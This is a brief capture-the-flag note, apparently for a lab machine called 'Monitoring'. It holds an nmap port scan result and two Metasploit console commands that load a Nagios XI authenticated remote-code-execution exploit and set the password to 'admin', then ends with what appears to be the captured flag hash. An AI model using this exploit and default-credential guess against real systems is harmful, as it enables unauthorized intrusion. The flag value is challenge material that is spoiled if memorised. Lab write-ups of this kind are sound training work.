----------------------------------------------------
# Author -> Shubham Rannpise
----------------------------------------------------
# Monitoring
# 16/2/2023

----------------------------------------------------
# nmap result
----------------------------------------------------
PORT    STATE SERVICE  VERSION
22/tcp  open  ssh      OpenSSH 7.2p2 Ubuntu 4ubuntu2.10 (Ubuntu Linux; protocol 2.0)
25/tcp  open  smtp     Postfix smtpd
80/tcp  open  http     Apache httpd 2.4.18 ((Ubuntu))
389/tcp open  ldap     OpenLDAP 2.2.X - 2.3.X
443/tcp open  ssl/http Apache httpd 2.4.18 ((Ubuntu))


MSFCONSOLE
use exploit/linux/http/nagios_xi_authenticated_rce
set password admin
 

 0c83fd7adea1858e9ada880f68076ae2